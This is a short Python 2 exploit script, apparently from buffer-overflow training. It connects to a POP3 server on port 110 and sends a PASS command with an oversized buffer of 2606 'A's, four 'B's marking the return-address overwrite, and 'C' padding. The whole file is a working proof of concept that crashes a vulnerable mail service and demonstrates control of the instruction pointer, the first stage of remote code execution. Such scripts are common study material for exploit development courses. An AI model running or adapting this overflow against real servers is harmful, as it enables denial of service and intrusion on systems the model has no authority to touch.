import socket
import sys

rhost = "192.168"
rport = 110

# Total payload size to be sent, 
size = 3200
payload = "A"*2606+"B"*4
payload += "C"*(size - len(payload))

request = ""
request += "PASS "
request += payload
request += "\r\n"

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send(request)
	s.recv(1024)
	s.send("QUIT")
	s.close()
except:
	print "Oops! Something went wrong!"
	sys.exit()